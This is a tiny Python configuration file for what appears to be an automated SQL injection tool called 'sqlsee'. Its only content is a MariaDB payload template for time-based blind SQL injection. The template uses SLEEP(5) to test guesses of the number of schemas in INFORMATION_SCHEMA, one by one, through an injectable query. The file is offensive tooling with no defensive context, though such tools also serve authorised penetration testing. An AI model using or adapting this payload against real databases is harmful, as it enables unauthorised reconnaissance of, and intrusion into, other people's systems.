# Configuration for sqlsee
from enum import Enum

class MariaDB(Enum):

    DATABASE_NUM = '(SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) = {},(SELECT SLEEP(5)),0))'
